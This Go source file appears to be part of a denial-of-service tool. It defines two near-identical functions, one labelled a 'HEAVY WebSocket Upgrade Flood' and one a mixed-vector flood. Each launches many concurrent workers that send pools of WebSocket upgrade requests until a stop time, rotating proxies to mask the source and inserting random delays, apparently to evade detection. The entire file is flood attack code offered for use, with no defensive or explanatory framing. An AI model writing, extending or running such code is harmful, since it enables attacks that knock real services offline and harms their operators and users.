package main

import (
	"fmt"
	"net/http"
	"sync"
	"time"
)

func executeHeavyWSFlood() {
	fmt.Printf("[VECTOR] HEAVY WebSocket Upgrade Flood\n")
	var wg sync.WaitGroup
	for i := 0; i < cfg.threadCount; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			proxy := ""
			client := newDirectClient()
			if cfg.useProxy {
				proxy = getNextProxy()
				client = getProxyClient(proxy)
			}
			for time.Now().Before(stopTime) {
				if cfg.useProxy {
					proxy = getNextProxy()
					client = getProxyClient(proxy)
				}
				reqPool := make([]*http.Request, POOL_SIZE_WS)
				for p := 0; p < len(reqPool); p++ {
					reqPool[p] = buildWSRequest()
				}
				for j := 0; j < len(reqPool) && time.Now().Before(stopTime); j++ {
					doRequest(client, reqPool[j])
				}
				time.Sleep(randomThinkTime())
			}
		}(i)
	}
	wg.Wait()
}

func executeMixVectorWSFlood(threadCount int) {
	var wg sync.WaitGroup
	for i := 0; i < threadCount; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			proxy := ""
			client := newDirectClient()
			if cfg.useProxy {
				proxy = getNextProxy()
				client = getProxyClient(proxy)
			}
			for time.Now().Before(stopTime) {
				if cfg.useProxy {
					proxy = getNextProxy()
					client = getProxyClient(proxy)
				}
				reqPool := make([]*http.Request, POOL_SIZE_WS)
				for p := 0; p < len(reqPool); p++ {
					reqPool[p] = buildWSRequest()
				}
				for j := 0; j < len(reqPool) && time.Now().Before(stopTime); j++ {
					doRequest(client, reqPool[j])
				}
				time.Sleep(randomThinkTime())
			}
		}(i)
	}
	wg.Wait()
}
